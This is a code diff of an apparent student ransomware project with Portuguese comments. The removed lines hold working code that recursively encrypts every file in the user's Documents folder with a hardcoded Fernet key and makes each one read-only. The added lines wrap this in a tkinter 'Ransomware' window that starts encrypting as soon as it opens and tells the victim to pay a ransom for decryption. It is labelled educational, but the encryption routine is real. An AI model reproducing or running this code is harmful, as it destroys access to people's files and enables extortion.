@@ -1,44 +1,50 @@
-import os  # Importa o módulo os para interagir com o sistema operacional
-from cryptography.fernet import Fernet 
+import tkinter as tk
+from tkinter import messagebox, simpledialog
+from threading import Thread
+import encriptor
+import decryptor
+
+class RansomwareGUI:
+    def __init__(self, master):
+
+        # Define a janela principal da interface gráfica e o título
+        self.master = master  
+        master.title("Ransomware") 
+
+        #Mensagem e botões 
+        self.label = tk.Label(master, text="WARNING: This program is a simulated ransomware attack for educational purposes only.")
+        self.label.pack(pady=20)
+
+        # Chama a função para encriptar os arquivos assim que a interface é iniciada
+        self.start_encryption()
+
+    def start_encryption(self):
+        # Função para iniciar a criptografia dos arquivos
+        Thread(target=self.encrypt_files).start()
+
+    def encrypt_files(self):
+        encriptor.encrypt_documents_directory()
+        messagebox.showinfo("Encryption Complete", "Encryption completed. Pay the ransom to decrypt your files.")
+        # Cria um botão para iniciar o processo de descriptografia
+        self.decrypt_button = tk.Button(self.master, text="Decrypt Files", command=self.start_decryption)
+        self.decrypt_button.pack(pady=10)
+
+    def start_decryption(self):
+        # Função para iniciar a descriptografia dos arquivos
+        key = simpledialog.askstring("Input", "Enter the decryption key:")
+        if key:
+            Thread(target=self.decrypt_files, args=(key.encode(),)).start()
+
+    def decrypt_files(self, key):
+        try:
+            decryptor.decrypt_documents_directory(key)
+            messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")
+
+        except Exception:
+            messagebox.showerror("Error", f"Decryption failed: {Exception}")
 
 
-
-# Define a chave fixa
-FIXED_KEY = 'yYdARKr1Xgo28CKfiY-r-z28f18ix7aSAi9R_ig9caI='
-
-# Define permissões de edição para o arquivo
-def allow_edit(file_path):
-    os.chmod(file_path, 0o644)  # Permissões de leitura e escrita
-
-# Define permissões de leitura para o arquivo
-def set_read_only(file_path):
-    os.chmod(file_path, 0o444)  
-
-# Função para encriptar um arquivo
-def encrypt_file(filename, key):
-
-    fernet = Fernet(key);
-    # Define permissões de edição
-    allow_edit(filename)
-
-    fernet = Fernet(key)  # Inicializa um objeto Fernet com a chave fornecida
-    # Lê os dados do arquivo original, encripta os dados e escreve os dados encriptados de volta no arquivo
-    with open(filename, "rb") as file:
-        original_data = file.read()  
-    encrypted_data = fernet.encrypt(original_data)
-    with open(filename, "wb") as file:
-        file.write(encrypted_data)  
-
-    # Define permissões de leitura
-    set_read_only(filename)
-
-# Função para encriptar todos os arquivos na diretoria documents
-def encrypt_documents_directory():
-    key = FIXED_KEY  # Utiliza sempre a mesma chave para que depois seja possível envia-la para o user
-
-    documents_directory = os.path.join(os.path.expanduser("~"), "Documents")  # Obtém o caminho para documents
-    # Percorre recursivamente a diretoria
-    for root, dirs, files in os.walk(documents_directory):
-        for file in files:
-            file_path = os.path.join(root, file)  # Obtém o caminho completo do arquivo
-            encrypt_file(file_path, key)  # Encripta o arquivo
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = RansomwareGUI(root)
+    root.mainloop()
